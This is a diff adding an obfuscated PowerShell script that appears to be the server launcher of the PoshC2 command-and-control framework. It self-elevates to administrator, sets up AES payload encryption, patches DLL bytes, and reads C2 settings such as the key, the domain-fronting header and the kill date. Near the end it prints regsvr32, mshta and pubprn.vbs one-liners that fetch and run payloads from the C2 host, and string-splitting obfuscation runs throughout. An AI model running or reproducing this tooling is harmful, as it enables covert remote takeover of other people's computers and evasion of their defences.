@@ -1,0 +1,1695 @@
+  set-vAriAbLe ('yvK'+'8') ( [type]("{1}{3}{5}{0}{6}{4}{2}"-f'wi','sECuriTy.PRiNC','TY','IP','ti','AL.','ndOWSIdEN')  );   sET  ("{1}{0}"-f 'P9','Uo78') ( [TYPe]("{1}{0}{2}"-F'nv','E','IrONMeNT') )  ;  ${4F`pl2X} =  [Type]("{3}{1}{5}{6}{8}{4}{10}{7}{2}{9}{0}" -f'odE','m','y.Ci','syste','RiTy.cry','.SE','C','Ph','u','PHeRM','PToGrA') ;    ${2`7F}=[TYPe]("{2}{5}{3}{4}{1}{6}{0}"-F 'aDDInGmoDe','PHY','SyStEm.S','urITy.CrYPTO','GRA','Ec','.P');  SET-iTem  ("VAr"+"iABL"+"E:4B"+"X") (  [TYpe]("{1}{0}{3}{2}" -f't.encO','tex','nG','dI')  ) ;${T`U7}  =[Type]("{4}{2}{0}{1}{3}"-f'Ve','r','steM.cOn','T','sy')  ; Set-VAriable  ("{0}{1}"-f'Pt5','2') (  [TypE]("{2}{4}{3}{1}{0}{5}" -f'D','O','IO.cOMprE','.COmPREssIoNM','ssIon','E') ) ;  ${w`9`2Ns4}  = [TYpE]("{1}{2}{0}"-f'E','dA','tETim')  ; Set-variablE ("{1}{0}"-f 'Z','q39u')  ( [tYPe]("{0}{1}{2}"-f 'io.FI','L','E')  ); ${z`9c}=  [TyPE]("{2}{3}{1}{0}" -f 'le','.iO.FI','SY','sTEm');seT-IteM  ("v"+"A"+"ri"+"AB"+"Le:C3TZ")  ( [TypE]("{0}{1}{2}" -f 'F','iLec','LaSS')  )  ;  SV  ("{1}{0}" -f'NWBX','1') (  [TYPe]("{0}{2}{1}"-F'SYSTeM.I','Th','o.pA') )  ;  SET-item ("{2}{1}{3}{0}" -f 'yR','IA','vaR','BLE:t') (  [TYpE]("{2}{0}{3}{1}"-f 'stEm.Io.f','dE','SY','iLeMo') )  ; ${lt`1F}= [tYpe]("{1}{0}{2}{3}" -f 'fILE','IO.','AC','CESs')  ;    sEt-iTEm  ('var'+'iABle:I'+'7V'+'3') ([Type]("{3}{0}{1}{2}"-F'A','R','e','io.filEsh'));   SEt  ("{1}{0}" -f'j','21') ([TYPe]("{2}{0}{1}"-f'NV','ert','cO') );Set-iTem  ("{2}{3}{1}{0}"-f '94sG','3','vArIABlE',':') ([tYpE]("{4}{3}{1}{0}{2}" -f'AG','nG.im','E','drawi','SysTEm.') )  ;    SV  ("CA"+"BT") (  [tYpe]("{3}{1}{2}{4}{0}"-f 'ING','xT.','eNCO','system.tE','d')  )  ;  
+function c`2-sErV`eR {
+Param(${pos`hpa`Th}, ${rE`sTa`Rtc2s`ER`Ver})
+
+
+If (-NOT ([Security.Principal.WindowsPrincipal] (get-VAriaBlE  ('YVk'+'8')  -vALueONLy)::("{0}{1}{2}{3}" -f 'G','etCu','rre','nt').Invoke())."Is`In`RoLe"([Security.Principal.WindowsBuiltInRole] ("{2}{1}{3}{0}" -f'strator','m','Ad','ini')))
+{   
+    ${A`RGuM`ENtS} = "& '" + ${M`YInVOcat`IoN}."my`comM`AnD"."De`FIni`TI`oN" + "'"
+    &("{0}{3}{1}{4}{2}"-f 'Star','-P','cess','t','ro') -FilePath ("{0}{1}{2}" -f 'p','o','wershell') -Verb ("{1}{0}" -f'nAs','ru') -ArgumentList ${a`RGumE`NTs}
+    Break
+}
+
+&("{0}{1}{2}{3}"-f 'Clear','-','Ho','st')
+&("{0}{2}{1}"-f'W','te-Host','ri') -Object ("{9}{6}{4}{2}{8}{5}{11}{7}{10}{3}{1}{0}"-f'  ','__','   ','___','_  ','____','__','  __','       .__.     __','_______','_','___')  -ForegroundColor ("{0}{1}" -f'Gr','een')
+&("{1}{2}{0}"-f'-Host','Wr','ite') -Object ((("{13}{11}{8}{7}{3}{4}{1}{15}{10}{0}{12}{14}{2}{5}{9}{6}"-f'   {1','}  {0','_','____','_{0','_','  {1} ',' {1}____  ','___ ',' {1} {1}_____','__','__','}_  ','{1}__',' _','}'))  -f [chAR]124,[chAR]92)  -ForegroundColor ("{1}{0}"-f 'reen','G')
+&("{1}{2}{3}{0}"-f 'ost','Write','-','H') -Object ((("{13}{2}{1}{10}{18}{6}{17}{3}{8}{15}{9}{4}{0}{5}{16}{12}{7}{14}{11}"-f'  ','}','0','}',' {1}  /','  {1',' {','/','/  ___/ ','{0} ','  ',' ____/ ','1}/  ',' {',' ',' ','}  {','1','   ___/  _'))  -f[cHaR]124,[cHaR]92)  -ForegroundColor ("{0}{1}"-f 'Gre','en')
+&("{1}{2}{0}" -f 't','Write-Ho','s') -Object ((("{13}{4}{10}{1}{5}{11}{15}{7}{6}{3}{14}{8}{9}{12}{0}{2}{16}" -f '    ','{1} ',' ','}   ','1',' (  <_> )___ {0}','{0} {0','Y  ','_','_/','}    ','{1}  ','  ',' {','  {0}__',' ','{0} '))-f  [CHAr]92,[CHAr]124)  -ForegroundColor ("{1}{0}"-f 'en','Gre')
+&("{1}{0}{2}{3}" -f'i','Wr','te-','Host') -Object ((("{4}{9}{7}{3}{0}{12}{11}{5}{1}{10}{2}{8}{6}" -f'__/_','}______','__','}__',' ',' {1',' {1}','0}   {1','__','{0}____{','  /{1}___',' / ','___  >___{0} ')) -F [chAr]124,[chAr]92)  -ForegroundColor ("{1}{0}"-f 'een','Gr')
+&("{2}{1}{0}" -f 'st','ite-Ho','Wr') -Object ((("{4}{15}{6}{10}{7}{0}{3}{8}{9}{13}{1}{11}{14}{12}{5}{2}"-f' {0}/','}/   ','{0}/',' ','              ',' ','   ','    ',' ','    ',' {0}/','  ','  ','    {0',' ','  '))-F  [cHaR]92)  -ForegroundColor ("{1}{0}"-f 'een','Gr')
+&("{1}{2}{0}"-f 't','Write-H','os') ("{3}{4}{7}{5}{2}{1}{8}{6}{0}" -f'==','k ===','shC2.co.u','====','======','ww.Po','======','===== v3.8 w','==') -ForegroundColor ("{0}{1}" -f 'Gr','een')
+&("{0}{2}{1}"-f'Writ','t','e-Hos') "" -ForegroundColor ("{0}{1}" -f'G','reen')
+
+if (!${r`ES`T`ARtC`2SeRVer}) {
+    ${P`ATHe`xI`stS} = &("{0}{2}{1}"-f'Te','Path','st-') ${PO`SHPatH}
+
+    if (!${p`A`The`xIsts}) {
+        ${Po`s`hpa`TH} = &("{2}{1}{0}"-f 'd-Host','ea','R') ("{7}{5}{2}{3}{0}{4}{9}{8}{6}{1}" -f 'irecto',' ','rshellC2',' d','ry, pleas','e Powe','th:','Cannot find th','fy pa','e speci')
+    }
+}
+
+
+${p} = ${en`V:`psmo`DuLEpA`TH}
+${p} += ";$PoshPath"
+  ${Uo`78`p9}::("{5}{1}{6}{4}{0}{2}{3}" -f'Vari','t','a','ble','vironment','Se','En').Invoke(("{0}{2}{3}{1}"-f 'PSM','Path','od','ule'),${p})
+&("{2}{1}{0}{4}{3}"-f'M','t-','Impor','e','odul') -Name ("{0}{1}"-f 'PSSQL','ite')
+${glo`Bal:`Ne`wd`iR} = ${Nu`LL}
+${IpV4`Ad`DR`ess} = ${n`UlL}
+${R`An`Dom`URiARRAY} = @()
+${taskI`d`Db} = 1 
+${E`xE} = ${f`A`Lse}
+&("{1}{0}{2}" -f'dd-Ty','A','pe') -TypeDefinition @"
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class FileClass
+{
+
+[DllImport("shlwapi", EntryPoint="PathSkipRoot")]
+public static extern IntPtr PathSkipRoot(IntPtr lpszSrc);
+
+public static string GetRoot(string Src) {
+    IntPtr cpyString = Marshal.StringToHGlobalAnsi(Src);
+    IntPtr pU = PathSkipRoot(cpyString);
+    string strName;
+    if (pU == IntPtr.Zero)
+        strName = null;
+    else
+        strName = Marshal.PtrToStringAnsi(pU);
+    Marshal.FreeHGlobal(cpyString);
+    return strName;
+}
+
+}
+
+"@
+
+
+function GET-`Ra`N`D`OMurI 
+{
+    param (
+        [int]${Le`NG`TH}
+    )
+    ${s`eT}    = ("{3}{1}{7}{9}{2}{8}{0}{6}{5}{4}" -f 'yz012','bc','qrstu','a','6789','5','34','defgh','vwx','ijklmnop').("{2}{1}{3}{0}" -f 'ay','oCh','T','arArr').Invoke()
+    ${Re`s`Ult} = ''
+    for (${x} = 0; ${x} -lt ${leN`g`TH}; ${x}++) 
+    {${Re`Sult} += ${S`et} | &("{0}{1}{2}{3}"-f 'G','et-','Rando','m')}
+    return ${rES`ULt}
+}
+
+
+function cReAT`E-Ae`SM`A`NA`GEdOBJE`CT 
+{
+    param
+    (
+        [Object]
+        ${K`eY},
+        [Object]
+        ${Iv}
+    )
+
+    ${A`eSM`AN`AGed} = &("{2}{0}{1}" -f 'ew-','Object','N') -TypeName ("{7}{4}{0}{3}{6}{8}{9}{10}{1}{5}{11}{2}" -f'.Security','.Rij','naged','.','em','ndaelM','C','Syst','r','yptogra','phy','a')
+    ${aEsmA`NA`Ged}."mo`De" =  (get-iTeM ("VarIabLE:"+"4"+"fP"+"L"+"2X")).VAluE::"c`BC"
+    ${A`eSmANAG`ED}."p`ADdIng" =   ( gI ("{2}{3}{1}{0}"-f':27F','IaBLE','v','aR')).vaLUe::"Zer`Os"
+    ${Ae`s`MAN`AGed}."bL`OcK`sIze" = 128
+    ${A`ESmA`NaGed}."kEY`SiZe" = 256
+    if (${I`V}) 
+    {
+        if (${i`V}.("{1}{0}"-f 'etType','g').Invoke()."N`AmE" -eq ("{1}{0}{2}"-f 't','S','ring')) 
+        {${AESMa`N`A`geD}."I`V" =   ( variabLe  ("{1}{0}" -f'7','tu') ).ValuE::("{3}{0}{2}{1}" -f 'rom','se64String','Ba','F').Invoke(${i`V})}
+        else 
+        {${A`EsMa`NAg`Ed}."iv" = ${I`V}}
+    }
+    if (${k`eY}) 
+    {
+        if (${K`eY}.("{1}{0}"-f 'tType','ge').Invoke()."NA`Me" -eq ("{2}{0}{1}"-f'n','g','Stri')) 
+        {${A`ESm`ANaGED}."k`EY" =   ${t`U7}::("{1}{0}{2}"-f 'se64Stri','FromBa','ng').Invoke(${K`ey})}
+        else 
+        {${aEsM`An`A`gEd}."k`Ey" = ${k`eY}}
+    }
+    ${aE`s`mAn`Aged}
+}
+
+
+function cr`eate-`AesKeY() 
+{
+    ${AE`s`MaNagED} = &("{2}{1}{3}{0}{4}{5}"-f 'n','e-Aes','Creat','Ma','aged','Object')
+    ${a`esMa`NA`gED}.("{1}{0}{2}" -f 'te','Genera','Key').Invoke()
+      ${T`U7}::"tOb`AS`e64s`T`Ring"(${AEs`maN`AgeD}."k`ey")
+}
+
+
+function e`NcrYPT-s`TRiNg2 
+{
+    param
+    (
+        [Object]
+        ${k`eY},
+        [Object]
+        ${UN`EN`c`RypTEDs`T`RiNG}
+    )
+    ${U`NEN`cr`yPtEdb`yTeS} =  ${Ca`Bt}::"uT`F8".("{2}{0}{1}"-f 'e','s','GetByt').Invoke(${UNenc`RyP`T`EDstrI`Ng})
+    ${cOmpr`ES`se`DS`TREAM} = &("{0}{2}{1}"-f'Ne','-Object','w') ("{2}{3}{0}{1}" -f'r','eam','IO.Memory','St')
+    ${dEFLaTes`TR`Eam} = &("{1}{2}{0}" -f'ct','New-O','bje') ("{2}{6}{0}{3}{4}{5}{1}" -f 'io','m','IO.Com','n.D','eflateS','trea','press') (${coM`Pre`sseD`st`Ream},  ${p`T52}::"Com`pr`EsS")
+    ${d`eFl`AtE`sTre`Am}.("{1}{0}" -f'ite','Wr').Invoke(${UNeN`cRY`pTEdbyt`eS}, 0, ${U`Nen`cryPtEdB`Y`TeS}."Len`gtH")
+    ${d`Eflat`es`TreAm}.("{1}{0}"-f'e','Dispos').Invoke()
+    ${By`TES} = ${co`mpR`ES`sEds`TR`eAM}.("{0}{2}{1}"-f'To','ay','Arr').Invoke()
+    ${co`mpr`e`sseDS`Tr`eaM}.("{0}{1}"-f'Dispos','e').Invoke()
+    ${a`eSMan`AGeD} = &("{3}{4}{2}{0}{1}" -f 'je','ct','nagedOb','Create-Aes','Ma') ${K`ey}
+    ${eN`c`RYptOR} = ${ae`Sm`AnaGED}.("{1}{2}{0}" -f'ryptor','C','reateEnc').Invoke()
+    ${eNCRYpt`EDdA`TA} = ${e`NCRYp`ToR}.("{0}{3}{4}{1}{2}"-f'T','loc','k','ransformFina','lB').Invoke(${b`Yt`Es}, 0, ${B`yt`eS}."LENG`TH")
+    [byte[]] ${FUL`L`DAta} = ${aes`m`AnagED}."iV" + ${eN`CrYpt`E`DdA`TA}
+    ${fU`Llda`TA}
+}
+
+
+function dECRYp`T`-sTRi`Ng2 (${k`EY}, ${by`TES}) {
+	${i`V} = ${By`TES}[0..15]
+	${AeSm`ANA`gED} = &("{1}{4}{3}{0}{2}"-f'nagedObje','Create-Ae','ct','a','sM') ${K`ey} ${iV}
+	${D`ECRyp`TOr} = ${aeSM`Ana`GeD}.("{0}{2}{1}"-f'Cre','eDecryptor','at').Invoke()
+	${bYt`eAR`RAY} = ${D`ecR`YPtOR}.("{3}{5}{1}{2}{0}{4}" -f 'lo','ina','lB','Transfo','ck','rmF').Invoke(${by`TES}, 16, ${byT`ES}."Leng`Th" - 16)
+    ${O`Ut`put} = (&("{2}{1}{0}" -f 'ect','w-Obj','Ne') ("{0}{1}{2}{3}{4}"-f 'I','O.','StreamRe','a','der') ($(&("{2}{0}{1}{3}" -f'bje','c','New-O','t') ("{5}{2}{6}{4}{1}{0}{3}" -f'on.GzipSt','si','te','ream','es','Sys','m.IO.Compr') ($(&("{2}{1}{0}"-f'ct','bje','New-O') ("{0}{3}{4}{2}{1}"-f 'I','am','e','O','.MemoryStr') (,${byt`Earr`AY})),  (  GcI ("va"+"rIabl"+"e:pT5"+"2")  ).valuE::"decO`mpre`sS")),   ${4`Bx}::"A`scIi")).("{0}{2}{1}"-f'Re','d','adToEn').Invoke()
+    ${oU`TP`UT}
+}
+
+
+function eNCR`YpT-`S`T`RiNg 
+{
+    param
+    (
+        [Object]
+        ${K`eY},
+        [Object]
+        ${UNeNCRyP`T`EDS`T`RI`NG}
+    )
+
+    ${by`Tes} =  ${cA`Bt}::"uT`F8".("{0}{1}"-f'Ge','tBytes').Invoke(${uNe`N`CRyPTeds`TRi`NG})
+    ${aesmAn`A`g`Ed} = &("{4}{5}{0}{6}{1}{3}{2}" -f 'sM','nag','dObject','e','Cr','eate-Ae','a') ${K`EY}
+    ${eNCRY`pT`OR} = ${AESm`An`AGeD}.("{2}{4}{3}{1}{0}"-f 'cryptor','En','Cr','ate','e').Invoke()
+    ${E`NCryP`T`ed`DATA} = ${En`CrYPT`Or}.("{0}{1}{2}{3}"-f 'Transfo','rmFinalB','lo','ck').Invoke(${b`YTES}, 0, ${B`yteS}."lEN`gth")
+    [byte[]] ${Fu`LLd`A`Ta} = ${AeS`MAN`AgEd}."iV" + ${EN`c`RYPteDDa`TA}
+      ${T`U7}::"T`o`BasE6`4stR`InG"(${fU`L`LdatA})
+}
+
+
+function deC`RyP`T-s`TRI`NG 
+{
+    param
+    (
+        [Object]
+        ${K`Ey},
+        [Object]
+        ${e`N`cRypt`ed`S`T`RiNgWIThIv}
+    )
+    ${bYT`ES} =  ${t`U7}::("{3}{0}{1}{2}"-f 'ase64S','tri','ng','FromB').Invoke(${En`c`RyPTed`sT`RIn`GWitH`iv})
+    ${iV} = ${B`ytes}[0..15]
+    ${Aes`M`AnaG`eD} = &("{3}{6}{0}{4}{1}{2}{5}" -f 'sMa','a','gedObjec','Cr','n','t','eate-Ae') ${k`Ey} ${i`V}
+    ${DecRy`p`Tor} = ${AES`maNAg`eD}.("{0}{2}{1}" -f'CreateD','or','ecrypt').Invoke()
+    ${unencRY`P`TE`DDATA} = ${Decr`yPt`oR}.("{1}{0}{2}{5}{4}{3}" -f 'ansform','Tr','Fina','k','oc','lBl').Invoke(${B`YTes}, 16, ${B`ytEs}."l`eNgTH" - 16)
+      ( GeT-varIAble ("{1}{0}" -f'BT','Ca') -VALueo  )::"ut`F8"."gE`T`STR`ING"(${u`NenCR`YPTEd`dATa})."t`RIm"([char]0)
+}
+function dEcRY`PT-`ByteS(${K`EY}, ${b`yTeS}) {
+	${iV} = ${b`YT`ES}[0..15]
+	${A`ESm`AnaGED} = &("{4}{5}{1}{2}{3}{0}" -f 't','e-','AesM','anagedObjec','Cr','eat') ${k`ey} ${Iv}
+	${d`ecrYpt`Or} = ${aEs`mANA`ged}.("{0}{3}{2}{1}"-f 'Cr','ptor','y','eateDecr').Invoke()
+	${BYt`E`ArraY} = ${DecR`Y`pt`or}.("{3}{4}{0}{2}{1}" -f 'mFin','Block','al','Transfo','r').Invoke(${byT`es}, 16, ${b`Y`TeS}."LENg`Th" - 16)
+	${I`NpUT} = &("{0}{2}{1}"-f'N','ject','ew-Ob') ("{3}{6}{4}{2}{0}{1}{5}"-f'Memory','S','.IO.','S','em','tream','yst')( , ${Byt`E`ARRaY} ) 
+    ${ouTp`Ut} = &("{1}{2}{0}" -f't','New-Obje','c') ("{5}{1}{6}{3}{0}{4}{2}"-f 'MemoryS','stem','am','.','tre','Sy','.IO')
+	${gZiP`S`TREam} = &("{2}{0}{1}"-f'Obj','ect','New-') ("{0}{3}{1}{5}{2}{6}{4}{7}"-f 'System.','O.','ss','I','zipStr','Compre','ion.G','eam') ${IN`PUt}, (  (vaRiAble ("{0}{1}" -f'P','t52') -VAluEoNl)::"deCoM`P`RE`ss")
+	${gz`IPs`TREAm}.("{1}{0}"-f 'pyTo','Co').Invoke( ${o`U`TpUt} )
+	${GZ`iPStR`EaM}.("{1}{0}" -f'e','Clos').Invoke()
+	${i`NpuT}.("{1}{0}"-f 'lose','C').Invoke()
+	[byte[]] ${byT`E`OUTARRay} = ${oU`TpuT}.("{1}{0}" -f 'Array','To').Invoke() 
+	${B`yTeO`UTa`RRaY}
+}
+
+function do`wNl`Oad-`File
+{
+    param
+    (
+        [string] ${S`OURCE`FilepaTh}
+    )
+ 
+    ${sour`CefilE`p`AtH} = &("{0}{2}{1}{3}" -f'Re','ve-','sol','PathSafe') ${s`ourcEfiL`E`PAth}
+    ${buffE`RS`IZe} = 90000
+    ${B`UfFeR} = &("{2}{1}{0}"-f'Object','ew-','N') ("{0}{1}" -f 'byte','[]') ${buFF`ER`SIze}
+    ${R`eAdER} =   ( gET-cHIldITem ("VaRiablE"+":Z9"+"C") ).ValuE::("{1}{0}{2}" -f 'enRe','Op','ad').Invoke(${So`Ur`cE`FiLe`paTH})
+    ${B`A`SE64} = ${N`UlL}
+     
+    ${bYt`ES`R`EAd} = 0
+    do
+    {
+        ${B`yT`e`SRead} = ${RE`A`DeR}.("{0}{1}"-f 'Rea','d').Invoke(${b`U`FFer}, 0, ${B`U`F`FersiZe});
+        ${ba`S`E64} += ( ( GCI ("VARI"+"aBle:2"+"1"+"J")  ).vALue::"T`o`BAS`E64s`TriNG"(${B`UFFER}, 0, ${bYTe`Sr`e`Ad}));
+    } while (${bY`T`ES`READ} -eq ${BU`F`FE`RSiZe});
+
+    ${b`AS`E64}
+    ${rEaD`Er}.("{0}{1}"-f'D','ispose').Invoke()
+}
+
+
+function cON`VertFR`oM`-`BASE64
+{
+    param
+    (
+        [string] ${sOurCEFIlEp`A`Th},
+        [string] ${T`ArgE`TfI`lepatH}
+    )
+ 
+    ${SoUR`cEF`IlEPa`TH} = &("{1}{0}{3}{2}" -f 'e','R','e','solve-PathSaf') ${SO`U`RCEF`ileP`ATh}
+    ${Targe`TFIL`epA`Th} = &("{2}{4}{0}{3}{1}"-f've-Pat','fe','R','hSa','esol') ${tARg`e`TfI`l`EPATH}
+    ${Buffe`RS`i`zE} = 90000
+    ${B`U`FfEr} = &("{0}{2}{1}" -f'New-Ob','ect','j') ("{2}{0}{1}"-f 'har[',']','c') ${bUff`eR`Si`zE}
+    ${reA`der} =   (dir ("{2}{1}{3}{0}" -f'Z9C','bLe','vARiA',':') ).Value::("{1}{2}{0}"-f'enText','O','p').Invoke(${SouRcefiL`E`pAtH})
+    ${W`RiT`ER} =   ( gET-ItEM ("{0}{1}{2}" -f'vAr','iaBL','E:z9C')  ).vALuE::("{0}{1}{2}" -f 'O','penW','rite').Invoke(${taRgEt`FI`LEpa`Th})
+     
+    ${b`yTesre`AD} = 0
+    do
+    {
+        ${bytE`sR`eAd} = ${RE`A`Der}.("{0}{1}"-f 'R','ead').Invoke(${bu`FfEr}, 0, ${Bu`Ff`eRSIZe});
+        ${BYT`Es} =  ( GCi  ("{2}{0}{1}" -f'BLE:2','1j','VAriA') ).vALuE::("{2}{1}{3}{0}"-f'rray','e64C','FromBas','harA').Invoke(${b`Uff`Er}, 0, ${b`Yt`eSrEaD});
+        ${W`Rit`er}.("{1}{0}"-f 'te','Wri').Invoke(${bYT`ES}, 0, ${b`Y`TES}."l`enG`Th");
+    } while (${B`Y`TeSREAd} -eq ${b`UFfeRSI`ZE});
+     
+    ${Re`Ad`er}.("{0}{1}" -f 'Dispos','e').Invoke()
+    ${wr`iteR}.("{1}{2}{0}" -f'spose','D','i').Invoke()
+}
+
+
+function rEsOL`VE-pA`Th`s`AFe
+{
+    param
+    (
+        [string] ${pA`TH}
+    )
+      
+    ${e`XE`cuti`onC`onTExt}."sE`ssIOns`TatE"."Pa`TH".("{1}{4}{7}{8}{9}{0}{5}{3}{6}{2}"-f 'e','G','omPSPath','Pro','et','d','viderPathFr','Unre','so','lv').Invoke(${Pa`TH})
+}
+
+function p`AtChd`Ll {
+    param(${Dl`lBy`T`es}, ${rE`PLacESTr`I`NG}, ${a`RCH}, ${OF`F`sEt})
+
+
+    if (${ar`Ch} -eq 'x86') {
+        ${Dll`ofFs`eT} = 0x00012F80
+        
+    }
+    if (${Ar`CH} -eq 'x64') {
+        ${D`l`LoffSET} = 0x00017300
+    }
+    if(${oFf`SeT}) {
+        ${dL`Loff`seT} = ${oF`FseT}
+    }
+
+    
+    ${r`EP`laCeSt`R`iNG`Bytes} = (  (GeT-VAriABle ("ca"+"bT")  ).vaLue::"unIc`oDE").("{0}{1}{2}"-f'GetB','y','tes').Invoke(${Rep`LAC`E`StrI`Ng})
+    
+    
+    ${dl`l`LenGTH} = ${Repla`CES`T`RING}."LENG`TH"
+    ${Patc`H`leNgTH} = 8000 -${d`lLLE`NgTh}
+    ${nUlL`s`TRing} = 0x00*${PatC`hle`N`gTh}
+    ${NUllB`yT`es} = ( ( vARIAbLE  ("{0}{1}"-f'C','ABT')).VaLuE::"uN`I`code").("{2}{1}{0}" -f's','Byte','Get').Invoke(${NUlLS`Tr`INg})
+    ${nUllB`YT`eS} = ${nullby`T`Es}[1..${pa`TcH`LEngth}]
+    ${RepLacENEWsT`R`I`NgBy`TES} = (${R`Ep`LaceSTriNGb`Yt`ES}+${N`UlLbY`TES})
+
+    ${D`llLeng`TH} = 16000 -2
+    ${I}=0
+    
+    ${DLlOFF`s`eT}..(${D`l`LofFseT} + ${D`Ll`lEnGth}) | &('%') {
+        ${d`L`lbytES}[${_}] = ${rE`p`laceNE`Wstr`iNGBYTeS}[${i}]
+        ${I}++
+    }
+    
+    
+    return ${DLlB`yTes}
+}
+
+
+if (${reSTa`RTc2Se`RVeR}) 
+{
+    ${GLObAl:`NE`w`D`ir} = ${R`e`st`ArtC2`servEr}
+    ${p`AYlO`AD} = &("{0}{1}{2}"-f 'Get-','Co','ntent') "$global:newdir\payloads\payload.bat"
+    &("{0}{2}{1}{3}"-f 'Wr','-','ite','Host') -Object ('Usi'+'n'+'g '+'exist'+'in'+'g '+'da'+'tabase'+' '+'a'+'nd '+'p'+'aylo'+'ads: '+"$global:newdir")
+    ${dA`TaBA`Se} = "$global:newdir\PowershellC2.SQLite"
+    ${tAsK`sC`oMPLeteD} = &("{2}{0}{3}{1}{5}{4}"-f 'vok','-','In','e','Query','Sqlite') -DataSource ${d`At`AbAsE} -Query ("{0}{5}{9}{6}{4}{3}{10}{1}{2}{7}{8}" -f 'SE','o','mpl',' FRO','dTaskID','LECT Com','ete','etedT','asks','pl','M C') -As ("{2}{0}{1}"-f 'ngle','Value','Si')
+
+    ${c`2`SERV`ErrE`SUltS} = &("{2}{0}{3}{1}" -f '-Sql','ery','Invoke','iteQu') -DataSource ${Da`TA`BaSe} -Query ("{2}{4}{1}{0}{3}"-f'FROM C2Serve','* ','SE','r','LECT ') -As ("{1}{0}" -f 't','PSObjec')
+    ${d`eFAul`TBEa`c`oN} = ${c`2S`ERvERreSu`l`TS}."DefauL`Ts`LE`eP"
+    ${KI`lLD`At`EfM} = ${C`2SeRveR`REsu`l`TS}."k`i`lLdATe"
+    ${e`NcKEY} = ${c2`sEr`VeR`Re`sUlTs}."EnCk`Ey"
+    ${IPv4`AdDre`ss} = ${c2`sE`R`VErR`eSUltS}."H`OST`NAMEiP" 
+    ${dom`A`InF`RonTheaDer} = ${c2`seRVeR`ResUl`Ts}."DOmA`iNF`R`O`NT`HEadEr" 
+    ${SeRvE`RP`ORT} = ${C2`Se`RveRresU`l`TS}."Ser`V`eR`PORT" 
+    ${SH`oR`TCut} = ${C2`SEr`VErrES`ULtS}."QUIc`KCOM`Mand"
+    ${do`W`NLoADU`Ri} = ${C2Se`Rver`R`eSu`lTs}."D`owNlOA`DURI"
+    ${Htt`p`R`espOnSE} = ${c2`sE`RverRESUlTS}."HtTP`ReSp`Onse"
+    ${ENaB`L`EsOunD} = ${C`2`seRVER`ResUl`TS}."s`OUndS"
+    ${ApIK`Ey} = ${c2S`ERV`e`Rr`EsULTs}."apiK`eY"
+    ${M`oB`IlENuM`BER} = ${c2`sERV`Er`RE`sulTs}."MOB`iL`enuMBer"
+    ${UrLST`R`INg} = ${C2sER`VE`Rres`UlTS}."U`Rls"
+    ${S`o`c`KS`UrlStrIng} = ${C2`S`ERvE`Rre`SUlTs}."Sock`S`URLS"
+    ${i`NSECurE} = ${C2sErverR`e`Su`L`TS}."i`NSe`CUrE"
+    ${USERA`g`enT} = ${C2seR`Ver`Resu`LtS}."Us`eRaG`EnT"
+    ${R`E`FeREr} = ${C2`SERve`Rre`SULTS}."rE`FerEr"
+
+    ${D`OwnLO`ADs`TUB} = ${urLST`R`INg} -split ","
+    ${Do`wN`l`oaD`stUbuRL} = ${DOwnLOA`D`St`UB}[1] -replace '"',''
+    ${n`ewIMpl`ANT} = ${uRl`Stri`NG} -split ","
+    ${n`eWI`mPLa`Ntu`RL} = ${N`eWIM`p`lANT}[0] -replace '"',''
+    ${h`osT}."u`I"."R`AWUI"."WiND`oW`T`iTLE" = ('Po'+'shC2 '+'S'+'e'+'rver: '+"$ipv4address "+'P'+'ort '+"$serverport")
+
+    &("{1}{0}{2}" -f 'os','Write-H','t') ((("{1}{0}{12}{5}{6}{17}{9}{11}{16}{15}{8}{14}{10}{13}{7}{3}{18}{4}{2}"-f 'ng ','
+Listeni','m','lda','f',': {1}ipv4addr','es','kil',') {0',' ','ll d','{1}serverport (HT','on','ate {1}','} Ki','P','T','s Port','te'))  -F [cHAR]124,[cHAR]36) ('
+') -ForegroundColor ("{0}{1}" -f'G','reen')
+    &("{0}{2}{1}"-f'W','t','rite-Hos') ("{2}{8}{6}{4}{7}{1}{10}{9}{12}{11}{5}{0}{3}" -f', ','tup for i','T','run:','uickly get','ting','q',' se','o ','ernal','nt','ntes',' pe')
+
+    &("{0}{2}{1}"-f 'w','e-host','rit') ${shOr`T`cUt} ('
+') -ForegroundColor ("{0}{1}"-f'gre','en')
+    &("{2}{0}{1}"-f'rite-Ho','st','w') ((("{22}{4}{27}{2}{7}{24}{0}{29}{3}{13}{20}{10}{16}{23}{8}{18}{30}{21}{1}{26}{14}{9}{19}{12}{15}{5}{17}{6}{25}{11}{28}" -f'P','r','hy app','id','or a more st','es',' usin','roach, use Su','do n','L','ms','P','cer','d','ed SS','tificat',', NOT',' if','ot ',' ','en ge','h unt','F','E: These ','bTee4w','g over HTT','ust','ealt','S:','s h','work wit'))-cRepLAcE  ([cHAR]52+[cHAR]119+[cHAR]80),[cHAR]39)
+    &("{1}{0}{2}"-f'o','write-h','st') "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll " -ForegroundColor ("{0}{1}" -f'gree','n')
+    &("{0}{2}{1}" -f'write-h','st','o') "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`" " -ForegroundColor ("{1}{0}" -f'n','gree')
+    &("{1}{0}{2}"-f'h','write-','ost') "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close) " -ForegroundColor ("{0}{1}"-f 'gr','een')
+    &("{2}{0}{3}{1}"-f'rite','ost','w','-h') ""
+    &("{2}{3}{1}{0}"-f'st','e-Ho','w','rit') ((("{9}{30}{33}{27}{10}{1}{25}{24}{18}{2}{29}{22}{19}{11}{21}{4}{3}{8}{12}{6}{32}{23}{13}{17}{28}{15}{14}{5}{0}{20}{34}{16}{26}{31}{7}"-f ' untruste',' ','S t','utio',' exec','th','NOTE: Th','ver HTTPS:','n,','O','s','a',' ',' ','rk wi','t wo','tifi','n','oJ','bt','d SSL ce','in','o','s','T','DotNet','cate','shaw{0}','o','o ','r use Fo','s if using o','is doe','r','r')) -F [cHaR]39)
+    &("{1}{2}{0}"-f't','writ','e-hos') "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close) " -ForegroundColor ("{0}{1}"-f 'g','reen')
+    &("{2}{1}{0}{3}" -f'e-hos','rit','w','t') "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`" " -ForegroundColor ("{1}{0}"-f'een','gr')
